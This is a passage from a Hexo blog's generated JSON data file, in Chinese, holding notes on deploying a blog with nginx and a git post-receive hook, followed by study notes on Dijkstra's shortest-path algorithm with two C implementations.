class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># Deployment</span><br><span class=\"hljs-comment\"># Docs: https://hexo.io/docs/deployment.html</span><br>deploy:<br>  <span class=\"hljs-built_in\">type</span>: git                                       <br>  repo: git@你的服务器ip:/home/git/blog.git\t\t<br>  branch: master  <br></code></pre></td></tr></table></figure>\n<h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><ul>\n<li>Nginx 403报错:将conf直接写在nginx.conf文件中;开放80端口</li>\n<li>图片无法加载(网页图片链接在github):取消本地hexo配置中github相关</li>\n<li>‘git’ 不是内部或外部命令，也不是可运行的程序<br>或批处理文件。  Sol：添加git到环境变量&gt;set PATH=%PATH%;C:\\Program Files\\Git\\bin</li>\n</ul>\n<h2 id=\"主题相关\"><a href=\"#主题相关\" class=\"headerlink\" title=\"主题相关\"></a>主题相关</h2><ul>\n<li>代码高亮显示：highlight:true;  然后在markdown文件里表明代码类型如C语言：csharp；</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Hexo相关\"><a href=\"#Hexo相关\" class=\"headerlink\" title=\"Hexo相关\"></a>Hexo相关</h2><ol>\n<li>npm hexo node安装</li>\n<li>hexo init blog(此处建议更换国内源,提高初始化速度,github乌龟速度)</li>\n<li>hexo g 生成静态页面,hexo s启动本地服务器, hexo d部署到github或者服务器</li>\n</ol>\n<h2 id=\"服务器相关\"><a href=\"#服务器相关\" class=\"headerlink\" title=\"服务器相关\"></a>服务器相关</h2><ol>\n<li>nginx,git安装<br>如果无法建立连接，可以在本地生成ssh-keygen,将公钥保存到服务器再进行部署</li>\n<li>nginx配置<br>a.nginx.conf<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">server &#123;<br>  <span class=\"hljs-comment\"># 侦听80端口</span><br>  listen 80;<br>  <span class=\"hljs-comment\"># 域名</span><br>  server_name www.catnipball.xyz;<br>  <span class=\"hljs-comment\">#默认请求</span><br>  location / &#123;<br>    <span class=\"hljs-comment\"># 网站根目录，此处为你的Hexo部署位置</span><br>    root /home/hexo;<br>    index index.html index.htm;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\nb.hooks:post-receive</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/bin/sh</span><br>git --work-tree=/home/hexo --git-dir=/home/git/blog.git checkout -f<br></code></pre></td></tr></table></figure>\n<p>c.local hexo项目</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># Deployment</span><br><span class=\"hljs-comment\"># Docs: https://hexo.io/docs/deployment.html</span><br>deploy:<br>  <span class=\"hljs-built_in\">type</span>: git                                       <br>  repo: git@你的服务器ip:/home/git/blog.git\t\t<br>  branch: master  <br></code></pre></td></tr></table></figure>\n<h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><ul>\n<li>Nginx 403报错:将conf直接写在nginx.conf文件中;开放80端口</li>\n<li>图片无法加载(网页图片链接在github):取消本地hexo配置中github相关</li>\n<li>‘git’ 不是内部或外部命令，也不是可运行的程序<br>或批处理文件。  Sol：添加git到环境变量&gt;set PATH=%PATH%;C:\\Program Files\\Git\\bin</li>\n</ul>\n<h2 id=\"主题相关\"><a href=\"#主题相关\" class=\"headerlink\" title=\"主题相关\"></a>主题相关</h2><ul>\n<li>代码高亮显示：highlight:true;  然后在markdown文件里表明代码类型如C语言：csharp；</li>\n</ul>\n"},{"title":"数据结构","date":"2021-04-09T10:03:45.000Z","mp3":null,"cover":"img/dijsktra.png","_content":"\n\n# 关于Dijkstra算法\n\n✔重要\n\n## 1.基本原理\n\n假设它的起点是 a ，要求它到各点的最短距离\n\nDijkstra 思路是维护一个集合 s ，集合内的点是已经确定最短路的点，可以视为一个大整体，每次操作找出与集合相邻的点中距离起点最近的点加入集合中，并确定它的最短路为它的上家的最短路+该边权值，存在 dis 中；\n\n形成类似于：dis=[∞，∞，∞，∞，∞]，其中∞表示不可达；s=[a,b,c,d,e]\n\n✨每次选择离“整体”最近的一个点加入s，此处注意整体的概念，是所有已有点连成的一个图；\n\n先用邻接矩阵存储数据，考虑采用一个二重循环，每次寻找出距离集合最近的一个点，然后数组标记它已经加入集合，然后在用当前点对不在集合中的点进行松弛，进行 n*n* 次，整个操作就完成了（此处代码中默认起点是1）\n\n```c\nvoid dijkstra()\n{\n    memset(dis,127/3,sizeof(dis));//初始化\n    v[1]=1;\n    dis[1]=0;\n    for(int i=1;i<=n;++i)\n    {\n        int k=0;\n        for(int j=1;j<=n;++j)//找出距离最近的点\n            if(!v[j]&&(k==0||dis[j]<dis[k]))\n                k=j;\n        v[k]=1;//加入集合\n        for(int j=1;j<=n;++j)//松弛\n            if(!v[j]&&dis[k]+a[k][j]<dis[j])\n                dis[j]=dis[k]+a[k][j];\n    }\n}\n\n```\n\n```c\n#参考代码2：\n#include <stdio.h>\n#include <conio.h>\n#include <stdlib.h>\n\n#define X 10000\n#define VertexNum  7  //实际上共有六个顶点（1---6）\n#define EdgeNum  9\n\nint Graph[VertexNum][VertexNum] =\n//0  1  2  3  4  5  6\n{ X, X, X, X, X, X, X,  //0\n  X, X, 6, 3, X, X, X,  //1\n  X, X, X, X, 5, X, X,  //2\n  X, X, 2, X, 3, 4, X,  //3\n  X, X, X, X, X, X, 3,  //4\n  X, X, X, X, 2, X, 5,  //5\n  X, X, X, X, X, X, X   //6\n};\n\nint Visited[VertexNum];\nint path[VertexNum];\nint Distance[VertexNum];\n\nvoid Dijkstra(int Begin)\n{\n  int MinEdge, Vertex, i,j, Edges;\n  Edges = 1;\n  Visited[Begin] = 1;\n  for (i = 1; i<VertexNum; i++) Distance[i] = Graph[Begin][i];\n\n  Distance[Begin] = 0;\n  printf(\"     1  2  3  4  5  6\\\\n\");\n  printf(\"-----------------------------------\\\\n\");\n  printf(\"s:%d\", Edges);\n  for( i=1; i<VertexNum; i++)\n  if (Distance[i] == X) printf(\"  *\"); else printf(\"%3d\",Distance[i]);\n  printf(\"\\\\n\");\n  while( Edges<VertexNum-1)\n  {\n    Edges++; MinEdge = X;\n    for(j=1; j<VertexNum; j++)\n    if (Visited[j]==0 && MinEdge > Distance[j] )\n    {\n Vertex = j; MinEdge = Distance[j];\n    }\n    Visited[Vertex] = 1;\n    printf(\"s:%d\",Edges);\n    for(j=1; j<VertexNum; j++)\n    {\n      if (Visited[j] == 0 && Distance[Vertex] + Graph[Vertex][j] <Distance[j])\n      {   Distance[j] = Distance[Vertex] + Graph[Vertex][j];\n   path[j] = Vertex;\n      }\n      //printf(\"%6d\",Distance[j]);\n       if (Distance[j] == X) printf(\"  *\"); else printf(\"%3d\",Distance[j]);\n    }\n    printf(\"\\\\n\");\n  }\n}\n\nvoid main()\n{\n  \n  int i;\n  int k;\n // clrscr();\n  for(i=0; i<VertexNum; i++) { Visited[i] = 0;  path[i] = 1;}\n  Dijkstra(1);\n  printf(\"\\\\n\\\\nAll Path-------------------------\\\\n\");\n\n\n  for(i=2; i<VertexNum; i++) //printf(\"%5d\",Visited[i]);\n  {\n     printf(\"[%d] \",Distance[i]);\n     k = i;\n     do\n     {\n       printf(\"%d<--\",k);\n       k  = path[k];\n     } while (k!=1);\n     printf(\"1 \\\\n\");\n  }\n}\n```\n\n","source":"_posts/Dijkstra算法.md","raw":"---\ntitle: 数据结构\ndate: 2021-04-09 18:03:45\ncategories: \n    - 算法\ntags: \n    - 笔记\n    - 王道考研\nmp3: \ncover: img/dijsktra.png\n---\n\n\n# 关于Dijkstra算法\n\n✔重要\n\n## 1.基本原理\n\n假设它的起点是 a ，要求它到各点的最短距离\n\nDijkstra 思路是维护一个集合 s ，集合内的点是已经确定最短路的点，可以视为一个大整体，每次操作找出与集合相邻的点中距离起点最近的点加入集合中，并确定它的最短路为它的上家的最短路+该边权值，存在 dis 中；\n\n形成类似于：dis=[∞，∞，∞，∞，∞]，其中∞表示不可达；s=[a,b,c,d,e]\n\n✨每次选择离“整体”最近的一个点加入s，此处注意整体的概念，是所有已有点连成的一个图；\n\n先用邻接矩阵存储数据，考虑采用一个二重循环，每次寻找出距离集合最近的一个点，然后数组标记它已经加入集合，然后在用当前点对不在集合中的点进行松弛，进行 n*n* 次，整个操作就完成了（此处代码中默认起点是1）\n\n```c\nvoid dijkstra()\n{\n    memset(dis,127/3,sizeof(dis));//初始化\n    v[1]=1;\n    dis[1]=0;\n    for(int i=1;i<=n;++i)\n    {\n        int k=0;\n        for(int j=1;j<=n;++j)//找出距离最近的点\n            if(!v[j]&&(k==0||dis[j]<dis[k]))\n                k=j;\n        v[k]=1;//加入集合\n        for(int j=1;j<=n;++j)//松弛\n            if(!v[j]&&dis[k]+a[k][j]<dis[j])\n                dis[j]=dis[k]+a[k][j];\n    }\n}\n\n```\n\n```c\n#参考代码2：\n#include <stdio.h>\n#include <conio.h>\n#include <stdlib.h>\n\n#define X 10000\n#define VertexNum  7  //实际上共有六个顶点（1---6）\n#define EdgeNum  9\n\nint Graph[VertexNum][VertexNum] =\n//0  1  2  3  4  5  6\n{ X, X, X, X, X, X, X,  //0\n  X, X, 6, 3, X, X, X,  //1\n  X, X, X, X, 5, X, X,  //2\n  X, X, 2, X, 3, 4, X,  //3\n  X, X, X, X, X, X, 3,  //4\n  X, X, X, X, 2, X, 5,  //5\n  X, X, X, X, X, X, X   //6\n};\n\nint Visited[VertexNum];\nint path[VertexNum];\nint Distance[VertexNum];\n\nvoid Dijkstra(int Begin)\n{\n  int MinEdge, Vertex, i,j, Edges;\n  Edges = 1;\n  Visited[Begin] = 1;\n  for (i = 1; i<VertexNum; i++) Distance[i] = Graph[Begin][i];\n\n  Distance[Begin] = 0;\n  printf(\"     1  2  3  4  5  6\\\\n\");\n  printf(\"-----------------------------------\\\\n\");\n  printf(\"s:%d\", Edges);\n  for( i=1; i<VertexNum; i++)\n  if (Distance[i] == X) printf(\"  *\"); else printf(\"%3d\",Distance[i]);\n  printf(\"\\\\n\");\n  while( Edges<VertexNum-1)\n  {\n    Edges++; MinEdge = X;\n    for(j=1; j<VertexNum; j++)\n    if (Visited[j]==0 && MinEdge > Distance[j] )\n    {\n Vertex = j; MinEdge = Distance[j];\n    }\n    Visited[Vertex] = 1;\n    printf(\"s:%d\",Edges);\n    for(j=1; j<VertexNum; j++)\n    {\n      if (Visited[j] == 0 && Distance[Vertex] + Graph[Vertex][j] <Distance[j])\n      {   Distance[j] = Distance[Vertex] + Graph[Vertex][j];\n   path[j] = Vertex;\n      }\n      //printf(\"%6d\",Distance[j]);\n       if (Distance[j] == X) printf(\"  *\"); else printf(\"%3d\",Distance[j]);\n    }\n    printf(\"\\\\n\");\n  }\n}\n\nvoid main()\n{\n  \n  int i;\n  int k;\n // clrscr();\n  for(i=0; i<VertexNum; i++) { Visited[i] = 0;  path[i] = 1;}\n  Dijkstra(1);\n  printf(\"\\\\n\\\\nAll Path-------------------------\\\\n\");\n\n\n  for(i=2; i<VertexNum; i++) //printf(\"%5d\",Visited[i]);\n  {\n     printf(\"[%d] \",Distance[i]);\n     k = i;\n     do\n     {\n       printf(\"%d<--\",k);\n       k  = path[k];\n     } while (k!=1);\n     printf(\"1 \\\\n\");\n  }\n}\n```\n\n","slug":"Dijkstra算法","published":1,"updated":"2021-04-09T09:14:40.000Z","_id":"clg29vyfz000oao9c5qhq8c7v","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"关于Dijkstra算法\"><a href=\"#关于Dijkstra算法\" class=\"headerlink\" title=\"关于Dijkstra算法\"></a>关于Dijkstra算法</h1><p>✔重要</p>\n<h2 id=\"1-基本原理\"><a href=\"#1-基本原理\" class=\"headerlink\" title=\"1.基本原理\"></a>1.基本原理</h2><p>假设它的起点是 a ，要求它到各点的最短距离</p>\n<p>Dijkstra 思路是维护一个集合 s ，集合内的点是已经确定最短路的点，可以视为一个大整体，每次操作找出与集合相邻的点中距离起点最近的点加入集合中，并确定它的最短路为它的上家的最短路+该边权值，存在 dis 中；</p>\n<p>形成类似于：dis=[∞，∞，∞，∞，∞]，其中∞表示不可达；s=[a,b,c,d,e]</p>\n<p>✨每次选择离“整体”最近的一个点加入s，此处注意整体的概念，是所有已有点连成的一个图；</p>\n<p>先用邻接矩阵存储数据，考虑采用一个二重循环，每次寻找出距离集合最近的一个点，然后数组标记它已经加入集合，然后在用当前点对不在集合中的点进行松弛，进行 n<em>n</em> 次，整个操作就完成了（此处代码中默认起点是1）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">dijkstra</span><span class=\"hljs-params\">()</span><br>&#123;<br>    <span class=\"hljs-built_in\">memset</span>(dis,<span class=\"hljs-number\">127</span>/<span class=\"hljs-number\">3</span>,<span class=\"hljs-keyword\">sizeof</span>(dis));<span class=\"hljs-comment\">//初始化</span><br>    v[<span class=\"hljs-number\">1</span>]=<span class=\"hljs-number\">1</span>;<br>    dis[<span class=\"hljs-number\">1</span>]=<span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">1</span>;i&lt;=n;++i)<br>    &#123;<br>        <span class=\"hljs-type\">int</span> k=<span class=\"hljs-number\">0</span>;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">1</span>;j&lt;=n;++j)<span class=\"hljs-comment\">//找出距离最近的点</span><br>            <span class=\"hljs-keyword\">if</span>(!v[j]&amp;&amp;(k==<span class=\"hljs-number\">0</span>||dis[j]&lt;dis[k]))<br>                k=j;<br>        v[k]=<span class=\"hljs-number\">1</span>;<span class=\"hljs-comment\">//加入集合</span><br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">1</span>;j&lt;=n;++j)<span class=\"hljs-comment\">//松弛</span><br>            <span class=\"hljs-keyword\">if</span>(!v[j]&amp;&amp;dis[k]+a[k][j]&lt;dis[j])<br>                dis[j]=dis[k]+a[k][j];<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\">#参考代码<span class=\"hljs-number\">2</span>：<br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;conio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> X 10000</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> VertexNum  7  <span class=\"hljs-comment\">//实际上共有六个顶点（1---6）</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> EdgeNum  9</span><br><br><span class=\"hljs-type\">int</span> Graph[VertexNum][VertexNum] =<br><span class=\"hljs-comment\">//0  1  2  3  4  5  6</span><br>&#123; X, X, X, X, X, X, X,  <span class=\"hljs-comment\">//0</span><br>  X, X, <span class=\"hljs-number\">6</span>, <span class=\"hljs-number\">3</span>, X, X, X,  <span class=\"hljs-comment\">//1</span><br>  X, X, X, X, <span class=\"hljs-number\">5</span>, X, X,  <span class=\"hljs-comment\">//2</span><br>  X, X, <span class=\"hljs-number\">2</span>, X, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">4</span>, X,  <span class=\"hljs-comment\">//3</span><br>  X, X, X, X, X, X, <span class=\"hljs-number\">3</span>,  <span class=\"hljs-comment\">//4</span><br>  X, X, X, X, <span class=\"hljs-number\">2</span>, X, <span class=\"hljs-number\">5</span>,  <span class=\"hljs-comment\">//5</span><br>  X, X, X, X, X, X, X   <span class=\"hljs-comment\">//6</span><br>&#125;;<br><br><span class=\"hljs-type\">int</span> Visited[VertexNum];<br><span class=\"hljs-type\">int</span> path[VertexNum];<br><span class=\"hljs-type\">int</span> Distance[VertexNum];<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">Dijkstra</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> Begin)</span><br>&#123;<br>  <span class=\"hljs-type\">int</span> MinEdge, Vertex, i,j, Edges;<br>  Edges = <span class=\"hljs-number\">1</span>;<br>  Visited[Begin] = <span class=\"hljs-number\">1</span>;<br>  <span class=\"hljs-keyword\">for</span> (i = <span class=\"hljs-number\">1</span>; i&lt;VertexNum; i++) Distance[i] = Graph[Begin][i];<br><br>  Distance[Begin] = <span class=\"hljs-number\">0</span>;<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;     1  2  3  4  5  6\\\\n&quot;</span>);<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;-----------------------------------\\\\n&quot;</span>);<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;s:%d&quot;</span>, Edges);<br>  <span class=\"hljs-keyword\">for</span>( i=<span class=\"hljs-number\">1</span>; i&lt;VertexNum; i++)<br>  <span class=\"hljs-keyword\">if</span> (Distance[i] == X) <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;  *&quot;</span>); <span class=\"hljs-keyword\">else</span> <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%3d&quot;</span>,Distance[i]);<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\\\n&quot;</span>);<br>  <span class=\"hljs-keyword\">while</span>( Edges&lt;VertexNum<span class=\"hljs-number\">-1</span>)<br>  &#123;<br>    Edges++; MinEdge = X;<br>    <span class=\"hljs-keyword\">for</span>(j=<span class=\"hljs-number\">1</span>; j&lt;VertexNum; j++)<br>    <span class=\"hljs-keyword\">if</span> (Visited[j]==<span class=\"hljs-number\">0</span> &amp;&amp; MinEdge &gt; Distance[j] )<br>    &#123;<br> Vertex = j; MinEdge = Distance[j];<br>    &#125;<br>    Visited[Vertex] = <span class=\"hljs-number\">1</span>;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;s:%d&quot;</span>,Edges);<br>    <span class=\"hljs-keyword\">for</span>(j=<span class=\"hljs-number\">1</span>; j&lt;VertexNum; j++)<br>    &#123;<br>      <span class=\"hljs-keyword\">if</span> (Visited[j] == <span class=\"hljs-number\">0</span> &amp;&amp; Distance[Vertex] + Graph[Vertex][j] &lt;Distance[j])<br>      &#123;   Distance[j] = Distance[Vertex] + Graph[Vertex][j];<br>   path[j] = Vertex;<br>      &#125;<br>      <span class=\"hljs-comment\">//printf(&quot;%6d&quot;,Distance[j]);</span><br>       <span class=\"hljs-keyword\">if</span> (Distance[j] == X) <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;  *&quot;</span>); <span class=\"hljs-keyword\">else</span> <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%3d&quot;</span>,Distance[j]);<br>    &#125;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\\\n&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>  <br>  <span class=\"hljs-type\">int</span> i;<br>  <span class=\"hljs-type\">int</span> k;<br> <span class=\"hljs-comment\">// clrscr();</span><br>  <span class=\"hljs-keyword\">for</span>(i=<span class=\"hljs-number\">0</span>; i&lt;VertexNum; i++) &#123; Visited[i] = <span class=\"hljs-number\">0</span>;  path[i] = <span class=\"hljs-number\">1</span>;&#125;<br>  Dijkstra(<span class=\"hljs-number\">1</span>);<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\\\n\\\\nAll Path-------------------------\\\\n&quot;</span>);<br><br><br>  <span class=\"hljs-keyword\">for</span>(i=<span class=\"hljs-number\">2</span>; i&lt;VertexNum; i++) <span class=\"hljs-comment\">//printf(&quot;%5d&quot;,Visited[i]);</span><br>  &#123;<br>     <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;[%d] &quot;</span>,Distance[i]);<br>     k = i;<br>     <span class=\"hljs-keyword\">do</span><br>     &#123;<br>       <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d&lt;--&quot;</span>,k);<br>       k  = path[k];<br>     &#125; <span class=\"hljs-keyword\">while</span> (k!=<span class=\"hljs-number\">1</span>);<br>     <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;1 \\\\n&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"关于Dijkstra算法\"><a href=\"#关于Dijkstra算法\" class=\"headerlink\" title=\"关于Dijkstra算法\"></a>关于Dijkstra算法</h1><p>✔重要</p>\n<h2 id=\"1-基本原理\"><a href=\"#1-基本原理\" class=\"headerlink\" title=\"1.基本原理\"></a>1.基本原理</h2><p>假设它的起点是 a ，要求它到各点的最短距离</p>\n<p>Dijkstra 思路是维护一个集合 s ，集合内的点是已经确定最短路的点，可以视为一个大整体，每次操作找出与集合相邻的点中距离起点最近的点加入集合中，并确定它的最短路为它的上家的最短路+该边权值，存在 dis 中；</p>\n<p>形成类似于：dis=[∞，∞，∞，∞，∞]，其中∞表示不可达；s=[a,b,c,d,e]</p>\n<p>✨每次选择离“整体”最近的一个点加入s，此处注意整体的概念，是所有已有点连成的一个图；</p>\n<p>先用邻接矩阵存储数据，考虑采用一个二重循环，每次寻找出距离集合最近的一个点，然后数组标记它已经加入集合，然后在用当前点对不在集合中的点进行松弛，进行 n<em>n</em> 次，整个操作就完成了（此处代码中默认起点是1）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">dijkstra</span><span class=\"hljs-params\">()</span><br>&#123;<br>    <span class=\"hljs-built_in\">memset</span>(dis,<span class=\"hljs-number\">127</span>/<span class=\"hljs-number\">3</span>,<span class=\"hljs-keyword\">sizeof</span>(dis));<span class=\"hljs-comment\">//初始化</span><br>    v[<span class=\"hljs-number\">1</span>]=<span class=\"hljs-number\">1</span>;<br>    dis[<span class=\"hljs-number\">1</span>]=<span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">1</span>;i&lt;=n;++i)<br>    &#123;<br>        <span class=\"hljs-type\">int</span> k=<span class=\"hljs-number\">0</span>;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">1</span>;j&lt;=n;++j)<span class=\"hljs-comment\">//找出距离最近的点</span><br>            <span class=\"hljs-keyword\">if</span>(!v[j]&amp;&amp;(k==<span class=\"hljs-number\">0</span>||dis[j]&lt;dis[k]))<br>                k=j;<br>        v[k]=<span class=\"hljs-number\">1</span>;<span class=\"hljs-comment\">//加入集合</span><br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> j=<span class=\"hljs-number\">1</span>;j&lt;=n;++j)<span class=\"hljs-comment\">//松弛</span><br>            <span class=\"hljs-keyword\">if</span>(!v[j]&amp;&amp;dis[k]+a[k][j]&lt;dis[j])<br>                dis[j]=dis[k]+a[k][j];<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span 